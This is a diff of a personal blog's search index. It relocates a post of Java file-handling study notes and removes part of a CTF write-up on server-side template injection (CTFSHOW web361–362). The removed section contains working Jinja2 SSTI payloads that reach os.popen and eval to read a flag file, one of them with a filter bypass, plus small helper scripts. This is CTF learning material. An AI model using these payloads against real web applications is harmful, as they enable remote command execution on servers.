@@ -1,6 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>JavaWeb中级学习笔记</title>
+    <url>/2024/03/22/JavaWeb%E4%B8%AD%E7%BA%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>
+
+<h1 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero h)</span> <span class="keyword">throws</span> EnemyDeadException&#123;</span><br><span class="line">        <span class="keyword">if</span>(h.hp == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EnemyDeadException</span>(h.name+<span class="string">&quot;已经死了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//击杀异常</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnemyDeadException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyDeadException</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyDeadException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="type">Hero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">chaospeo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        ewoji.name = <span class="string">&quot;ewoji&quot;</span>;</span><br><span class="line">        chaospeo.name = <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">        chaospeo.hp = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ewoji.attack(chaospeo);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (EnemyDeadException e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240329103008655.png"  alt="image-20240329103008655"></p>
+<h1 id="找出C盘中最大和最小的文件"><a href="#找出C盘中最大和最小的文件" class="headerlink" title="找出C盘中最大和最小的文件"></a>找出C盘中最大和最小的文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span><span class="number">0</span> ,n = <span class="number">0</span>;</span><br><span class="line">		<span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;c://&quot;</span>);</span><br><span class="line">		File f[] = <span class="keyword">new</span> <span class="title class_">File</span>[f1.listFiles().length];</span><br><span class="line">		f = f1.listFiles();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; f.length; i++) &#123;</span><br><span class="line">		<span class="comment">//f.length()返回的是一个long型的数字</span></span><br><span class="line">			<span class="type">long</span> max,min;</span><br><span class="line">			max = f[<span class="number">0</span>].length();</span><br><span class="line">			min = f[<span class="number">0</span>].length();</span><br><span class="line">			<span class="keyword">if</span>(max&lt;f[i].length())&#123;</span><br><span class="line">				max = f[i].length();</span><br><span class="line">				m = i;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(min&gt;f[i].length())&#123;</span><br><span class="line">				min = f[i].length();</span><br><span class="line">				n=i;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">&quot;最大的文件是&quot;</span>+f[m].getName()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;大小是&quot;</span>+f[m].length());</span><br><span class="line">		System.out.println(<span class="string">&quot;最小的文件是&quot;</span>+f[n].getName()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;大小是&quot;</span>+f[n].length());</span><br><span class="line">&#125;		</span><br></pre></td></tr></table></figure>
+
+<p>不知道是不是权限问题，扫出来好几个文件是0kb</p>
+<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/双重url编码.py&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span>(<span class="type">FileInputStream</span> <span class="variable">fio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f))&#123;</span><br><span class="line">       <span class="type">byte</span> text[] = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>)f.length()];</span><br><span class="line">       <span class="type">char</span> tex[] = <span class="keyword">new</span> <span class="title class_">char</span>[text.length];</span><br><span class="line">       <span class="comment">//填充的是数字字节</span></span><br><span class="line">       fio.read(text);</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; text.length; i++) &#123;</span><br><span class="line">          tex[i] = (<span class="type">char</span>)text[i];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">String</span> <span class="variable">my</span> <span class="operator">=</span> String.valueOf(tex);</span><br><span class="line">       System.out.println(my);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="创建文件并且写入文件"><a href="#创建文件并且写入文件" class="headerlink" title="创建文件并且写入文件"></a>创建文件并且写入文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test.txt&quot;</span>);</span><br><span class="line">		<span class="comment">//创建</span></span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			f.createNewFile();</span><br><span class="line">		&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//写入</span></span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="type">FileOutputStream</span> <span class="variable">fio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f);</span><br><span class="line">			<span class="type">byte</span> ji[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>&#125;;</span><br><span class="line">			fio.write(ji);</span><br><span class="line">			fio.close();</span><br><span class="line">		&#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240329115117304.png"  alt="image-20240329115117304"></p>
+<h1 id="拆分文件"><a href="#拆分文件" class="headerlink" title="拆分文件"></a>拆分文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拆分</span></span><br><span class="line"><span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test1.txt&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test2.txt&quot;</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    f1.createNewFile();</span><br><span class="line">    f2.createNewFile();</span><br><span class="line">&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fio1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f1);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fio2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f2);</span><br><span class="line">    <span class="type">byte</span> kb1[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="type">byte</span> kb2[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="type">byte</span> kb3[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fio3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">    fio3.read(kb3);</span><br><span class="line">    fio3.close();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; kb1.length; i++) &#123;</span><br><span class="line">       kb1[i] = kb3[i];</span><br><span class="line">       kb2[i] = kb3[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fio1.write(kb1);</span><br><span class="line">    fio2.write(kb2);</span><br><span class="line">    fio1.close();</span><br><span class="line">    fio2.close();</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="用流复制图片"><a href="#用流复制图片" class="headerlink" title="用流复制图片"></a>用流复制图片</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">		<span class="type">FileInputStream</span> <span class="variable">fr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;e://ctf/ljava/go.png&quot;</span>);</span><br><span class="line">		<span class="type">byte</span> kb[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">		fr.read(kb);</span><br><span class="line">		<span class="type">FileOutputStream</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;e://ctf/ljava/go1.png&quot;</span>);</span><br><span class="line">		fw.write(kb);</span><br><span class="line">		fr.close();</span><br><span class="line">		fw.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//main</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HDCTF Junior 2024 Winter WP</title>
     <url>/2024/02/22/HDCTF-Junior-2024-Winter-WP/</url>
     <content><![CDATA[<h1 id="新生选拔赛"><a href="#新生选拔赛" class="headerlink" title="新生选拔赛"></a>新生选拔赛</h1><span id="more"></span>
@@ -75,33 +102,6 @@
         <tag>ctf</tag>
         <tag>wp</tag>
         <tag>入门</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JavaWeb中级学习笔记</title>
-    <url>/2024/03/22/JavaWeb%E4%B8%AD%E7%BA%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>
-
-<h1 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero h)</span> <span class="keyword">throws</span> EnemyDeadException&#123;</span><br><span class="line">        <span class="keyword">if</span>(h.hp == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EnemyDeadException</span>(h.name+<span class="string">&quot;已经死了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//击杀异常</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnemyDeadException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyDeadException</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyDeadException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="type">Hero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">chaospeo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        ewoji.name = <span class="string">&quot;ewoji&quot;</span>;</span><br><span class="line">        chaospeo.name = <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">        chaospeo.hp = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ewoji.attack(chaospeo);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (EnemyDeadException e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240329103008655.png"  alt="image-20240329103008655"></p>
-<h1 id="找出C盘中最大和最小的文件"><a href="#找出C盘中最大和最小的文件" class="headerlink" title="找出C盘中最大和最小的文件"></a>找出C盘中最大和最小的文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span><span class="number">0</span> ,n = <span class="number">0</span>;</span><br><span class="line">		<span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;c://&quot;</span>);</span><br><span class="line">		File f[] = <span class="keyword">new</span> <span class="title class_">File</span>[f1.listFiles().length];</span><br><span class="line">		f = f1.listFiles();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; f.length; i++) &#123;</span><br><span class="line">		<span class="comment">//f.length()返回的是一个long型的数字</span></span><br><span class="line">			<span class="type">long</span> max,min;</span><br><span class="line">			max = f[<span class="number">0</span>].length();</span><br><span class="line">			min = f[<span class="number">0</span>].length();</span><br><span class="line">			<span class="keyword">if</span>(max&lt;f[i].length())&#123;</span><br><span class="line">				max = f[i].length();</span><br><span class="line">				m = i;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(min&gt;f[i].length())&#123;</span><br><span class="line">				min = f[i].length();</span><br><span class="line">				n=i;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">&quot;最大的文件是&quot;</span>+f[m].getName()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;大小是&quot;</span>+f[m].length());</span><br><span class="line">		System.out.println(<span class="string">&quot;最小的文件是&quot;</span>+f[n].getName()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;大小是&quot;</span>+f[n].length());</span><br><span class="line">&#125;		</span><br></pre></td></tr></table></figure>
-
-<p>不知道是不是权限问题，扫出来好几个文件是0kb</p>
-<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/双重url编码.py&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span>(<span class="type">FileInputStream</span> <span class="variable">fio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f))&#123;</span><br><span class="line">       <span class="type">byte</span> text[] = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>)f.length()];</span><br><span class="line">       <span class="type">char</span> tex[] = <span class="keyword">new</span> <span class="title class_">char</span>[text.length];</span><br><span class="line">       <span class="comment">//填充的是数字字节</span></span><br><span class="line">       fio.read(text);</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; text.length; i++) &#123;</span><br><span class="line">          tex[i] = (<span class="type">char</span>)text[i];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">String</span> <span class="variable">my</span> <span class="operator">=</span> String.valueOf(tex);</span><br><span class="line">       System.out.println(my);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="创建文件并且写入文件"><a href="#创建文件并且写入文件" class="headerlink" title="创建文件并且写入文件"></a>创建文件并且写入文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test.txt&quot;</span>);</span><br><span class="line">		<span class="comment">//创建</span></span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			f.createNewFile();</span><br><span class="line">		&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//写入</span></span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="type">FileOutputStream</span> <span class="variable">fio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f);</span><br><span class="line">			<span class="type">byte</span> ji[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>&#125;;</span><br><span class="line">			fio.write(ji);</span><br><span class="line">			fio.close();</span><br><span class="line">		&#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240329115117304.png"  alt="image-20240329115117304"></p>
-<h1 id="拆分文件"><a href="#拆分文件" class="headerlink" title="拆分文件"></a>拆分文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拆分</span></span><br><span class="line"><span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test1.txt&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test2.txt&quot;</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    f1.createNewFile();</span><br><span class="line">    f2.createNewFile();</span><br><span class="line">&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fio1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f1);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fio2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f2);</span><br><span class="line">    <span class="type">byte</span> kb1[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="type">byte</span> kb2[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="type">byte</span> kb3[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fio3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">    fio3.read(kb3);</span><br><span class="line">    fio3.close();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; kb1.length; i++) &#123;</span><br><span class="line">       kb1[i] = kb3[i];</span><br><span class="line">       kb2[i] = kb3[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fio1.write(kb1);</span><br><span class="line">    fio2.write(kb2);</span><br><span class="line">    fio1.close();</span><br><span class="line">    fio2.close();</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="用流复制图片"><a href="#用流复制图片" class="headerlink" title="用流复制图片"></a>用流复制图片</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">		<span class="type">FileInputStream</span> <span class="variable">fr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;e://ctf/ljava/go.png&quot;</span>);</span><br><span class="line">		<span class="type">byte</span> kb[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">		fr.read(kb);</span><br><span class="line">		<span class="type">FileOutputStream</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;e://ctf/ljava/go1.png&quot;</span>);</span><br><span class="line">		fw.write(kb);</span><br><span class="line">		fr.close();</span><br><span class="line">		fw.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//main</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <tags>
-        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -318,71 +318,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SSTI-CTFSHOW</title>
-    <url>/2024/03/29/SSTI-CTFSHOW/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<p><a class="link"   href="https://boogipop.com/2023/03/02/CTFSHOW-SSTI/" >CTFSHOW-SSTI - Boogiepop Doesn’t Laugh (boogipop.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>巨几把详细，使我逐渐理解一切</p>
-<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240329185224740.png"  alt="image-20240329185224740"></p>
-<p>需要在url传入name&#x3D;payload</p>
-<p>但是我们并不知道subclasses()后，os._wrap_close类在哪</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185402511.png"  alt="image-20240329185402511"></p>
-<p>小写了个脚本去找</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">  text = <span class="built_in">input</span>(<span class="string">&quot;[+]需要查找的文本为:&quot;</span>)</span><br><span class="line">  pattern = <span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]你可能要找的类有:os._wrap_close,file,site._Printer,subprocess.Popen,warnings.catch_warnings&quot;</span>)</span><br><span class="line">  find = <span class="built_in">input</span>(<span class="string">&quot;[+]需要匹配的类为:&quot;</span>)</span><br><span class="line">  result = re.findall(pattern,text)</span><br><span class="line">  <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">      <span class="keyword">if</span>(re.<span class="keyword">match</span>(find,val)):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[-]下标为&quot;</span>,i)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;[+]继续扣1结束扣0:&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185449121.png"  alt="image-20240329185449121"></p>
-<p>进而payload&#x3D;<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
-<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240403152139654.png"  alt="image-20240403152139654"></p>
-<p>一样的name传参，把上题的payload放了进去，给我回了个板脸</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153827422.png"  alt="image-20240403153827422"></p>
-<p>不知道禁了什么，我们把payload一个字一个字拆开再用burpsuite爆破进行fuzz</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;[+]需要拆解的文本为&quot;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;dep.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    file.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153936033.png"  alt="image-20240403153936033"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153954072.png"  alt="image-20240403153954072"></p>
-<p>发现把2和3ban掉了，相当于想ban掉<code>os._wrap_close</code>呗</p>
-<p>payload1:<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[147-15].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
-<p>payload2:<code>?name=&#123;%set b=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()&#125;&#125;</code></p>
-<p>payload3:<code>?name=&#123;&#123;x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')&#125;&#125;</code></p>
-<p>payload4:</p>
